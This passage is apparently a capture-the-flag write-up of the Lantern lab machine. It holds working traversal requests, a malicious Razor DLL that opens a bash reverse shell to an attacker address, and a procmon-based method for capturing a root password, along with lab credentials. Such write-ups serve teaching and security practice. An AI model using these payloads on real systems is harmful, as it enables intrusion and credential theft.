      if (RuntimeInformation.IsOSPlatform(OSPlatform.Create("browser")))
      {
        IJSObjectReference module = await this._js.InvokeAsync<IJSObjectReference>("import", (object) "./dbstorage.js");
        await module.InvokeVoidAsync("synchronizeFileWithIndexedDb", (object) "Data.db");
        module = (IJSObjectReference) null;
      }
      ClientSideDbContext db = await this._dbContextFactory.CreateDbContextAsync(new CancellationToken());
      object obj = (object) null;
      int num = 0;
      try
      {
        int num1 = await db.Database.EnsureCreatedAsync(new CancellationToken()) ? 1 : 0;
        if (!((IQueryable<Employee>) db.Employees).Any<Employee>())
        {
          Employee[] employeeArray = new Employee[6];
          Employee employee1 = new Employee();
          employee1.Uid = "JFMDK";
          employee1.Name = "John";
          employee1.SecondName = "Smith";
          employee1.BirthDay = new DateTime(2000, 6, 1).ToShortDateString();
          employee1.JoinDate = new DateTime(2022, 8, 9).ToShortDateString();
          employee1.Salary = 120000;
          employee1.VacationsStart = new DateTime(2023, 12, 1).ToShortDateString();
          DateTime dateTime = new DateTime(2023, 12, 5);
          employee1.VacationsEnd = dateTime.ToShortDateString();
          employee1.InternalInfo = Encoding.UTF8.GetString(Convert.FromBase64String("SGVhZCBvZiBzYWxlcyBkZXBhcnRtZW50LCBlbWVyZ2VuY3kgY29udGFjdDogKzQ0MTIzNDU2NzgsIGVtYWlsOiBqb2huLnNAZXhhbXBsZS5jb20="));
          employeeArray[0] = employee1;
          Employee employee2 = new Employee();
          employee2.Uid = "PPAOS";
          employee2.Name = "Anny";
          employee2.SecondName = "Turner";
          dateTime = new DateTime(1989, 1, 11);
          employee2.BirthDay = dateTime.ToShortDateString();
          dateTime = new DateTime(2022, 2, 11);
          employee2.JoinDate = dateTime.ToShortDateString();
          employee2.Salary = 150000;
          employee2.InternalInfo = Encoding.UTF8.GetString(Convert.FromBase64String("SFIsIGVtZXJnZW5jeSBjb250YWN0OiArNDQxMjM0NTY3OCwgZW1haWw6IGFubnkudEBleGFtcGxlLmNvbQ=="));
          employeeArray[1] = employee2;
          Employee employee3 = new Employee();
          employee3.Uid = "UAYWP";
          employee3.Name = "Catherine";
          employee3.SecondName = "Rivas";
          dateTime = new DateTime(2001, 11, 7);
          employee3.BirthDay = dateTime.ToShortDateString();
          dateTime = new DateTime(2023, 3, 1);
          employee3.JoinDate = dateTime.ToShortDateString();
          employee3.Salary = 100000;
          dateTime = new DateTime(2024, 2, 22);
          employee3.VacationsStart = dateTime.ToShortDateString();
          dateTime = new DateTime(2024, 2, 23);
          employee3.VacationsEnd = dateTime.ToShortDateString();
          employee3.InternalInfo = Encoding.UTF8.GetString(Convert.FromBase64String("RnVsbFN0YWNrIGRldmVsb3BlciwgZW1lcmdlbmN5IGNvbnRhY3Q6ICs0NDEyMzQ1Njc4LCBlbWFpbDogY2F0aGVyaW5lLnJAZXhhbXBsZS5jb20="));
          employeeArray[2] = employee3;
          Employee employee4 = new Employee();
          employee4.Uid = "GMNZQ";
          employee4.Name = "Lara";
          employee4.SecondName = "Snyder";
          dateTime = new DateTime(1999, 4, 4);
          employee4.BirthDay = dateTime.ToShortDateString();
          dateTime = new DateTime(2019, 11, 11);
          employee4.JoinDate = dateTime.ToShortDateString();
          employee4.Salary = 200000;
          employee4.InternalInfo = Encoding.UTF8.GetString(Convert.FromBase64String("UFIsIGVtZXJnZW5jeSBjb250YWN0OiArNDQxMjM0NTY3OCwgZW1haWw6IGxhcmEuc0BleGFtcGxlLmNvbQ=="));
          employeeArray[3] = employee4;
          Employee employee5 = new Employee();
          employee5.Uid = "XZCSF";
          employee5.Name = "Lila";
          employee5.SecondName = "Steele";
          dateTime = new DateTime(1997, 12, 8);
          employee5.BirthDay = dateTime.ToShortDateString();
          dateTime = new DateTime(2019, 12, 9);
          employee5.JoinDate = dateTime.ToShortDateString();
          employee5.Salary = 130000;
          employee5.InternalInfo = Encoding.UTF8.GetString(Convert.FromBase64String("SnVuaW9yIC5ORVQgZGV2ZWxvcGVyLCBlbWVyZ2VuY3kgY29udGFjdDogKzQ0MTIzNDU2NzgsIGVtYWlsOiBsaWxhLnNAZXhhbXBsZS5jb20="));
          employeeArray[4] = employee5;
          Employee employee6 = new Employee();
          employee6.Uid = "POMBS";
          employee6.Name = "Travis";
          employee6.SecondName = "Duarte";
          dateTime = new DateTime(1999, 7, 23);
          employee6.BirthDay = dateTime.ToShortDateString();
          dateTime = new DateTime(2024, 1, 21);
          employee6.JoinDate = dateTime.ToShortDateString();
          employee6.Salary = 90000;
          employee6.InternalInfo = Encoding.UTF8.GetString(Convert.FromBase64String("U3lzdGVtIGFkbWluaXN0cmF0b3IsIEZpcnN0IGRheTogMjEvMS8yMDI0LCBJbml0aWFsIGNyZWRlbnRpYWxzIGFkbWluOkFKYkZBX1FAOTI1cDlhcCMyMi4gQXNrIHRvIGNoYW5nZSBhZnRlciBmaXJzdCBsb2dpbiE="));
          employeeArray[5] = employee6;
          Employee[] employees = employeeArray;
          await db.Employees.AddRangeAsync(employees);
          employees = (Employee[]) null;
        }
        await this.Update(db);
        await base.OnInitializedAsync();
        num = 1;
      }
      catch (object ex)
      {
        obj = ex;
      }
      if (db != null)
        await ((IAsyncDisposable) db).DisposeAsync();
      object obj1 = obj;
      if (obj1 != null)
      {
        if (!(obj1 is Exception source))
          throw obj1;
        ExceptionDispatchInfo.Capture(source).Throw();
      }
      if (num == 1)
      {
        db = (ClientSideDbContext) null;
      }
      else
      {
        obj = (object) null;
        db = (ClientSideDbContext) null;
        db = (ClientSideDbContext) null;
      }
    }

```

This is seeding the DB with the initial employees. Most of the data is normal, but the `InternalInfo` field for each is encoded with base64.

#### Decode InternalInfo

To quickly decode this info, I’ll use `strings` to fetch these long strings, and then decode each:

```

oxdf@hacky$ strings -el -n 80 InternaLantern.dll | tail -6 | while read line; do echo $line | base64 -d; echo; done
Head of sales department, emergency contact: +4412345678, email: john.s@example.com
HR, emergency contact: +4412345678, email: anny.t@example.com
FullStack developer, emergency contact: +4412345678, email: catherine.r@example.com
PR, emergency contact: +4412345678, email: lara.s@example.com
Junior .NET developer, emergency contact: +4412345678, email: lila.s@example.com
System administrator, First day: 21/1/2024, Initial credentials admin:AJbFA_Q@925p9ap#22. Ask to change after first login!

```

The last line has the password!

### Admin Page Enumeration

#### Overview

The admin dashboard has a several different components:

![image-20240821142613194](/img/image-20240821142613194.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

On the left there are links to “Files”, “Upload content”, “Health check”, “Logs”, and “Uploaded resumes”. There’s also a “Choose Modeule” section, and some charts on the right side (these are static and meaningless).

The search bar in the middle offers options when I start typing:

![image-20240821152408437](/img/image-20240821152408437.png)

Selecting one and hitting “Search” will load one of the same five modules linked to on the left.

If I enter something that isn’t one of the five, there’s an error message:

![image-20240821152502969](/img/image-20240821152502969.png)

So each of those must be a `.dll` file in `/opt/components`.

The system returns a different message if I try directory traversal:

![image-20240821154142609](/img/image-20240821154142609.png)

It seems to require that the module be in `/opt/components`.

#### Files / FileTree

The files component shows a tree of files in `/var/www/sites/lantern.htb`. Clicking on one of these will show it in a box to the right:

![image-20240821152640763](/img/image-20240821152640763.png)

I’ll note the main site is a Flask application as I suspected [above](/2024/11/30/htb-lantern.html#tech-stack). In the `app.py` source, I’ll note the three routes identified above, as well as one more:

```

@app.route('/PrivacyAndPolicy')
def sendPolicyAgreement():
    lang = request.args.get('lang')
    file_ext = request.args.get('ext')
    try:
            return send_file(f'/var/www/sites/localisation/{lang}.{file_ext}') 
    except: 
            return send_file(f'/var/www/sites/localisation/default/policy.pdf', 'application/pdf')

```

That’s a very unsafe file fetch, which I should be able to abuse to read arbitrary files from the main site.

```

oxdf@hacky$ curl 'http://lantern.htb/PrivacyAndPolicy?lang=.&ext=/../../../etc/hosts'
127.0.0.1 localhost lantern.htb
127.0.1.1 lantern

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

I’ll keep that in mind for later.

#### Upload content / FileUpload

This offers a simple form to upload images:

![image-20240821153335808](/img/image-20240821153335808.png)

When I select a test file, it uploads:

![image-20240821153547813](/img/image-20240821153547813.png)

And it shows up in the Files tab:

![image-20240821153622803](/img/image-20240821153622803.png)

If I try to upload another file with the same name, it fails and says the file already exists. It seems this can create files but not overwrite them.

#### Health check / HealthCheck

This one shows that the host is up, and gets stuck loading more:

![image-20240821153721169](/img/image-20240821153721169.png)

I’m not sure what else it’s supposed to do, if anything.

#### Logs / Logs

The Logs module shows the access and application logs:

![image-20240821153805052](/img/image-20240821153805052.png)

Nothing too exciting here.

#### Uploaded resumes / Resumes

This one shows the resumes that are in the system:

![image-20240821153849190](/img/image-20240821153849190.png)

One is from when I submitted without giving it a file, and the attachment is 0 bytes. The other two are dummy resumes.

### Arbitrary File Write

#### Strategy

I can already upload to the `images` directory via the File Upload feature, and to an `uploads` directory for resumes using the main site. I would like to be able to upload outside those directories. The source code for the resume upload doesn’t show anything to target:

```

@app.route('/submit', methods=['POST'])
def save_vacancy():
    name = request.form.get('name')
    email = request.form.get('email')
    vacancy = request.form.get('vacancy', default='Middle Frontend Developer')

    if 'resume' in request.files:
        try:
            file = request.files['resume']
            resume_name = file.filename
            if resume_name.endswith('.pdf') or resume_name == '':
                filename = secure_filename(f"resume-{name}-{vacancy}-latern.pdf")
                upload_folder = os.path.join(os.getcwd(), 'uploads')
                destination = '/'.join([upload_folder, filename])
                file.save(destination)
            else:
                return "Only PDF files allowed!"
        except:
            return "Something went wrong!"
    return "Thank you! We will contact you very soon!"

```

So I’ll have to look at how the FileUpload module works.

#### DLL Reversing

I’ll use the file read vulnerability in the main site to get the binary:

```

oxdf@hacky$ wget 'http://lantern.htb/PrivacyAndPolicy?lang=.&ext=/../../../opt/components/FileUpload.dll' -O FileUpload.dll
--2024-08-21 15:46:49--  http://lantern.htb/PrivacyAndPolicy?lang=.&ext=/../../../opt/components/FileUpload.dll
Resolving lantern.htb (lantern.htb)... 10.10.11.29
Connecting to lantern.htb (lantern.htb)|10.10.11.29|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11776 (12K) [application/x-msdos-program]
Saving to: ‘FileUpload.dll’

FileUpload.dll             100%[=====================================>]  11.50K  --.-KB/s    in 0s      

2024-08-21 15:46:50 (53.1 MB/s) - ‘FileUpload.dll’ saved [11776/11776]

oxdf@hacky$ file FileUpload.dll 
FileUpload.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows

```

It’s a 32-bit .NET assembly.

I’ll open the binary in DotPeek. The binary has a single namespace, `FileUpload`, with two classes, `Component` and `_Imports`:

![image-20240821155312589](/img/image-20240821155312589.png)

This task handles the file upload:

```

    private async 
    #nullable enable
    Task LoadFiles(InputFileChangeEventArgs e)
    {
      this.isLoading = true;
      this.loadedFiles.Clear();
      foreach (IBrowserFile file in (IEnumerable<IBrowserFile>) e.GetMultipleFiles(this.maxAllowedFiles))
      {
        try
        {
          this.loadedFiles.Add(file);
          string FileName = file.Name.Replace("\\", "");
          string path = Path.Combine("/var/www/sites/lantern.htb/static/images", FileName);
          if (!this.isFileExist(FileName))
          {
            await using (FileStream fs = new FileStream(path, FileMode.Create))
            {
              await file.OpenReadStream(this.maxFileSize).CopyToAsync((Stream) fs);
              this.UIMessage = "Success!";
              this.UIMessageType = "alert-success";
            }
          }
          else
          {
            this.UIMessage = "An error occurred: File already exist";
            this.UIMessageType = "alert-danger";
          }
          FileName = (string) null;
          path = (string) null;
        }
        catch (Exception ex)
        {
          this.UIMessage = "An error occurred: " + ex.Message;
          this.UIMessageType = "alert-danger";
        }
        this.ShowError();
      }
      this.isLoading = false;
    }

```

It removes backslash, but does no other form of input sanitization. That suggests that if I can get a directory traversal payload to this function, it will write anywhere.

#### Upload Comms Reversing

Looking at the messages that are sent when I upload a file, it’s all in the binary format I noted [above](/2024/11/30/htb-lantern.html#tech-stack-1). There’s a neat Burp extension that will convert this format to JSON, [Blazor Traffic Processor](https://portswigger.net/bappstore/8a87b0d9654944ccbdf6ae8bdd18e1d4). I’ll install it via the Burp BApp Store (in Extensions –> BApp Store). Now I can decode the messages by pasting them into the extension.

When I select a file in the app, the first message that goes out looks like:

```

À·BeginInvokeDotNetFromJS¡2À¬NotifyChangeÙi[[{"id":1,"lastModified":"2024-08-21T19:33:58.244Z","name":"test","size":15,"contentType":"","blob":{}}]]

```

When I paste that into BTP and click “Deserialize”, it gives JSON:

![image-20240821163525259](/img/image-20240821163525259.png)

This is the message that specifies the name:

```

[{
   "Target": "BeginInvokeDotNetFromJS",
   "Headers": 0,
   "Arguments": [
      "2",
      "null",
      "NotifyChange",
      2,
      [[{
         "blob": {},
         "size": 15,
         "name": "test",
         "id": 1,
         "lastModified": "2024-08-21T19:33:58.244Z",
         "contentType": ""
      }]]
   ],
   "MessageType": 1
}]

```

On each successive upload, the first number in the arguments increments, and the `id` field increments, so that the first number is always one more than the `id`. Knowing this allows me to prepare my payload.

A few messages later there’s another one with the plaintext of the uploaded file:

![image-20240821163639130](/img/image-20240821163639130.png)

It seems that BTP crashes if I give it a payload with a newline in it.

#### Traversal POC

To test for traversal, I’ll try to write to `/opt/components`. This is easier if I catch Blazor working in polling HTTP mode rather than websockets because I can just put intercept on in Burp. Now I’ll upload a file. When I upload, Burp catches it:

![image-20240821165304659](/img/image-20240821165304659.png)

Grab a payload that has the right argument, `id`, and an updated `name` with a traversal string. Then I’ll modify that and switch BTP to serialize mode:

![image-20240821165352820](/img/image-20240821165352820.png)

I’ll replace the payload in the Intercept window, forward it, and then turn intercept off to allow the rest of the requests to go through unmodified. It reports success:

![image-20240821165446944](/img/image-20240821165446944.png)

Using the file read in the site confirms it worked:

```

oxdf@hacky$ curl 'http://lantern.htb/PrivacyAndPolicy?lang=.&ext=/../../../opt/components/test.txt'
0xdf was here

```

### Malicious Razor Lib

#### Razor POC Initial Errors

I’ll open Visual Studio and create a new project, selecting “Razor Class Library” as the template. If that isn’t showing up, at the bottom there’s a link to open the installer to add “Workloads”. I’ll need the “ASP.NET and web development” one. I’ll name it and set the path:

![image-20240822083531163](/img/image-20240822083531163.png)

On the next page I’ll need to pick a .NET version. I don’t know it yet, but I’ll need 6.0.

![image-20240822083759949](/img/image-20240822083759949.png)

The resulting project has a few files created:

![image-20240822083830868](/img/image-20240822083830868.png)

`Component1.razor` has some HTML:

![image-20240822083911871](/img/image-20240822083911871.png)

I’ll switch to release and build the project. At this point, before adding any code, I just want to see if this will load. It builds:

![image-20240822083948605](/img/image-20240822083948605.png)

I could also get the same result on Linux using `dotnet new razorclasslib -o LanternExploit -f net6.0` and then `dotnet build LanternExploit --configuration Release`.

I’ll upload this to Lantern and search for the module. It finds it, but there’s an error:

![image-20240822084236814](/img/image-20240822084236814.png)

If I wasn’t already in .NET 6, this is where it would be clear that that version is needed. It is also complaining about not finding `Component`.

#### POC RE

I’ll open this POC dll in DotPeek and take a look:

![image-20240822084611053](/img/image-20240822084611053.png)

There’s a `LanternExploit` namespace, with a `Component1` class. The code overrides the `BuildRenderTree` function with the HTML from the `.razor` file:

```

namespace LanternExploit
{
...[snip]...
    public partial class Component1 : global::Microsoft.AspNetCore.Components.ComponentBase
    #nullable disable
    {
        #pragma warning disable 1998
        protected override void BuildRenderTree(global::Microsoft.AspNetCore.Components.Rendering.RenderTreeBuilder __builder)
        {
            __builder.AddMarkupContent(0, "<div class=\"my-component\" b-ls9lqve1mb>\r\n    This component is defined in the <strong b-ls9lqve1mb>LanternExploit</strong> library.\r\n</div>");
        }
        #pragma warning restore 1998
    }
}
#pragma warning restore 1591

```

That class name must have come from the name of the `.razor` file.

#### Working Razor POC

Back in VisualStuido in the Solutions Explorer, I’ll rename `Component1.razor` to `Component.razor`. That renames the CSS file as well.

On rebuilding and reloading into DotPeek, it looks better:

![image-20240822085123959](/img/image-20240822085123959.png)

There’s a cron running periodially that will clear out the Admin page and remove any loaded DLLs. I have to wait for that cron, or change the name (which involves changing the name of the entire project). Once that’s done, if I re-upload, and “Search”, it loads:

![image-20240822085341502](/img/image-20240822085341502.png)

The HTML from my dll is added to the page.

#### Shell

With the help of ChatGPT, I’ll get code added to `Component.razor` to execute commands on the server when the dll is loaded. I’m going to override the `OnInitialized` function I noted [above](/2024/11/30/htb-lantern.html#internallanterndll), as that seems like a good time to run.

```

@using System.Diagnostics;
<div class="my-component">
    Exploited by 0xdf.
</div>

@code
{
    protected override void OnInitialized()
    {
        try {
            Process p = new Process();
            p.StartInfo.FileName = "/bin/bash";
            p.StartInfo.Arguments = "-c \"/bin/bash -i >& /dev/tcp/10.10.14.6/443 0>&1 \"";
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }
}

```

I’ll compile this and upload it to Lantern. On loading it, the HTML is added:

![image-20240822090021231](/img/image-20240822090021231.png)

And I get a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.29 47494
bash: cannot set terminal process group (63574): Inappropriate ioctl for device
bash: no job control in this shell
tomas@lantern:~/LanternAdmin$ 

```

I’ll [upgrade my shell](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

tomas@lantern:~/LanternAdmin$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
tomas@lantern:~/LanternAdmin$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
tomas@lantern:~/LanternAdmin$

```

And grab `user.txt`:

```

tomas@lantern:~$ cat user.txt
03997bf1************************

```

There’s also an SSH keypair I can grab to get SSH access as tomas.

## Shell as root

### Enumeration

#### Users

tomas is the only user on the box with a home directory in `/home`:

```

tomas@lantern:/home$ ls
tomas

```

And the only non-root user with a shell set:

```

tomas@lantern:/home$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
tomas:x:1000:1000:tomas:/home/tomas:/bin/bash

```

There’s not a ton of stuff in tomas’ home directory:

```

tomas@lantern:~$ ls -la
total 48
drwxr-x--- 9 tomas tomas 4096 Aug  7 11:01 .
drwxr-xr-x 3 root  root  4096 Dec 24  2023 ..
drwxrwxr-x 3 tomas tomas 4096 Dec 26  2023 .aspnet
lrwxrwxrwx 1 root  root     9 Aug  1 13:30 .bash_history -> /dev/null
-rw-r--r-- 1 tomas tomas 3788 Dec 30  2023 .bashrc
drwx------ 2 tomas tomas 4096 Dec 24  2023 .cache
drwxrwxr-x 4 tomas tomas 4096 Dec 26  2023 .dotnet
drwxrwxr-x 9 tomas tomas 4096 Jul 31 11:58 LanternAdmin
drwxrwxr-x 3 tomas tomas 4096 Dec 26  2023 .local
drwxrwxr-x 4 tomas tomas 4096 Dec 26  2023 .nuget
-rw-r--r-- 1 tomas tomas  807 Jan  6  2022 .profile
drwx------ 2 tomas tomas 4096 Jul 31 11:55 .ssh
-rw-r--r-- 1 tomas tomas    0 Dec 24  2023 .sudo_as_admin_successful
-rw-r----- 1 root  tomas   33 Aug 22 13:07 user.txt

```

`LanternAdmin` has the admin web application, and while it’s interesting to poke at, there’s nothing useful in there for escalation:

```

tomas@lantern:~$ ls LanternAdmin/
App.razor                     bin             LanternAdmin.csproj       Pages       Shared
appsettings.Development.json  Data            LanternAdmin.csproj.user  Program.cs  wwwroot
appsettings.json              _Imports.razor  obj                       Properties

```

#### Processes

There are two processes that jump out at me immediately running as root:

```

tomas@lantern:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...[snip]...
root        3721  0.0  0.1  17496  4916 ?        Ssl  16:50   0:00 /usr/bin/expect -f /root/bot.exp
root        3722  0.0  0.1   7272  4044 pts/0    Ss+  16:50   0:00 nano /root/automation.sh
...[snip]...

```

There’s a root bot doing something with `expect`, a [program designed to talk to other interactive programs](https://linux.die.net/man/1/expect) via script, and `nano` is open with an automation script.

#### sudo

tomas can run `procmon` as root:

```

tomas@lantern:~$ sudo -l
Matching Defaults entries for tomas on lantern:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tomas may run the following commands on lantern:
    (ALL : ALL) NOPASSWD: /usr/bin/procmon

```

`procmon` is the [Linux version](https://github.com/Sysinternals/ProcMon-for-Linux) of the [SysInternals](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) tool.

### Recover Root Password

#### Procmon Overview

I’ll start `procmon` and attach it to the interesting `nano` process with `sudo procmon -p $(pidof nano)`. It loads a text user interface (TUI):

[![image-20240822133426926](/img/image-20240822133426926.png)*Click for full size image*](/img/image-20240822133426926.png)

It shows various system calls being made by the process.

#### Write Events

`write` sys calls are particularly interesting. I’ll ctrl-c to exit and re-run with `-e write` (image cropped to remove unnecessary columns):

[![image-20240822133536209](/img/image-20240822133536209.png)*Click for full size image*](/img/image-20240822133536209.png)

I get the return value of the call, which for write is the number of bytes written. There’s the file descriptor, which seems to always be 1 (which is `stdout`).

It doesn’t show up well on my screen on Lantern, but on their GitHub page the F buttons are clear:

![image-20240822135115219](/img/image-20240822135115219.png)

I’ll wait a few minutes, and then hit F6 to explort to a file, and F9 to exit.

#### Database

I’ll `scp` that DB file back to my box and take a look. It’s SQLite:

```

oxdf@hacky$ file procmon_2024-08-22_17\:02\:49.db 
procmon_2024-08-22_17:02:49.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 16, database pages 172, cookie 0x10, schema 4, UTF-8, version-valid-for 16

```

It’s got three tables:

```

oxdf@hacky$ sqlite3 procmon_2024-08-22_17\:02\:49.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
ebpf      metadata  stats

```

`metadata` and `stats` are information about the collection:

```

sqlite> .schema metadata
CREATE TABLE metadata (startTime INT, startEpocTime TEXT);
sqlite> .schema stats
CREATE TABLE stats (syscall TEXT, count INTEGER, duration INTEGER);

```

`ebpf` has the data:

```

CREATE TABLE ebpf (pid INT, stacktrace TEXT, comm TEXT, processname TEXT, resultcode INTEGER, timestamp INTEGER, syscall TEXT, duration INTEGER, arguments BLOB);

```

There’s a lot of rows in `ebpf`:

```

sqlite> select count(*) from ebpf;
2850

```

I’m interested in `resultcode` and `arguments`:

```

sqlite> .headers on
sqlite> select resultcode, arguments from ebpf limit 10;
resultcode|arguments
5|
6|
0|
6|
0|
0|
0|
0|
0|
6|

```

The arguments don’t show up. That’s because it’s binary data. If I output it as hex, it works:

```

sqlite> select resultcode, hex(arguments) from ebpf limit 10;
resultcode|hex(arguments)
5|04000000000000007B224944223A22313732343334363137302E39310004030000000000003B3C49FFC35500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
6|04000000000000007B224944223A22313732343334363137302E39310004030000000000003B3C49FFC35500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
0|04000000000000007B224944223A22313732343334363137302E39310004030000000000003B3C49FFC35500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
6|01000000000000001B5B3F32356C1B28426563686F3443284220526500060000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
0|01000000000000001B5B3F32356C1B28426563686F3443284220526500060000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
0|01000000000000001B5B3F32356C1B28426563686F3443284220526500060000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
0|01000000000000001B5B3F32356C1B28426563686F3443284220526500060000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
0|01000000000000001B5B3F32356C1B28426563686F3443284220526500060000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
0|01000000000000001B5B3F32356C1B28426563686F3443284220526500060000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
6|01000000000000001B5B3F3235681B28426563686F3443284220526500060000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

```

The `arguments` is a bit tricky to fiure out. The args to `write` are `ssize_t write(int fd, const void buf[.count], size_t count);`. The first int is eight bytes, and is mostly 1. In fact, the only times it’s not 1 is at the start of my file:

```

sqlite> select resultcode, hex(arguments) from ebpf where substr(hex(arguments), 1, 2) != "01" limit 10;
resultcode|hex(arguments)
5|04000000000000007B224944223A22313732343334363137302E39310004030000000000003B3C49FFC35500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
6|04000000000000007B224944223A22313732343334363137302E39310004030000000000003B3C49FFC35500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
0|04000000000000007B224944223A22313732343334363137302E39310004030000000000003B3C49FFC35500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

```

I’ll ignore these for now.

Then seems to come the buffer. It’s not clear why the buffer is always much longer than the return value (bytes written).

#### Extract

I didn’t get this perfect, but I got close enough. I’ll write a Python script that will pull the data and try to print it:

```

#!/usr/bin/env python3
import sqlite3

conn = sqlite3.connect('procmon_2024-08-22_17:02:49.db')
cursor = conn.cursor()

cursor.execute("SELECT * from ebpf;")
rows = cursor.fetchall()

for row in rows:
    res = int(row[4])
    args = row[-1]
    if res == 0:
        continue
    buffer = args[8:8+res]
    print(buffer.decode().replace('\r','\n'), end='')

```

It gets all the rows, and loops over them. If `write` returns that it wrote any bytes, it gets that many bytes from the `arguments` and prints them. There’s a bunch of `\r` to reset the cursor to the start of the line, and I’ll replace that with newline so I can see it all.

```

oxdf@hacky$ python extract_text.py 
{"ID"{"ID": . //bbaacckkuupp..sshh
e
eecchh
echo Q 33EEddddttddww33ppMMBB | s uuddoo . //bbaacckkuupp..sshh
e
eecchh
echo Q 33EEddddttddww

eecchh
echo Q 33EEddddttddww33ppMMBB | s uuddoo . //bbaacckkuupp..sshh
e
eecchh
echo Q 33EEddddttddww33ppMMBB | s uuddoo

```

It seems to be writing a password that gets piped into `sudo`. It also seems that many of the characters are printed twice. I can get the gist with a bit of guessing or I can look a bit more closely at the table. Repeated data seems to show up in successive rows with the same timestamp. I’ll add a check for that:

```

import re
import sqlite3

#conn = sqlite3.connect('procmon_2024-08-22_18:00:01.db')
conn = sqlite3.connect('procmon_2024-08-22_17:02:49.db')
cursor = conn.cursor()

cursor.execute("SELECT * from ebpf;")
rows = cursor.fetchall()

time = 0
for row in rows:
    res = int(row[4])
    if row[5] == time:
        continue
    time = row[5]
    args = row[-1]
    if res == 0:
        continue
    buffer = args[8:8+res]
    print(buffer.decode().replace('\r','\n'), end='')

```

Now it prints more cleanly:

```

oxdf@hacky$ python extract_text.py 
{"ID" ./backup.sh
e
ech
echo Q3Eddtdw3pMB | sudo ./backup.sh
e
e
echo Q3Eddtdw3pMB | sudo ./backup.sh
echo Q3Eddtdw3pMB | sudo ./backup.sh
e
ech
echo Q3Eddtdw3pMB | sudo

```

The password “Q3Eddtdw3pMB” works for root:

```

tomas@lantern:~$ su -
Password: 
root@lantern:~# 

```

And I can grab `root.txt`:

```

root@lantern:~# cat root.txt
b498043f************************

```

#### Data Without Duplicate Rows

It turns out if I run `procmon` without any filters at the command line, the resulting data in the database doesn’t have the issue of duplicate rows to filter out. If I do that, I can use the following Python script:

```

import sqlite3

conn = sqlite3.connect('procmon_2024-11-29_11:34:04.db')
cursor = conn.cursor()

cursor.execute("SELECT * from ebpf where syscall = 'write'||x'00' and processname = 'nano'||x'00';")
rows = cursor.fetchall()

for row in rows:
    res = int(row[4])
    args = row[-1]
    buffer = args[8:8+res]
    print(buffer.decode().replace('\r', '\n'), end='')

print()

```

This time it uses the SQL query to filter for the target process name and syscall. There’s a lot of ANSI control codes in the data moving around the terminal (which makes sense for something like `nano` where the terminal is constantly rewriting the entire screen rather than just outputting on character at a time). I start to address with the `replace` call, but it doesn’t completely fix it. If I run this from a terminal that isn’t on the top line (after a `clear` or `reset`), it actually prints the results above the line it was run from. From the top, it looks like:

```

oxdf@hacky$ python extract_from_all.py 
backup.sh

e
e
echo Q3Eddtdw3pMB | sudo ./backup.sh
echo Q3Eddtd

```

There is likely more refinement that could happen here, but this is good enough for sure.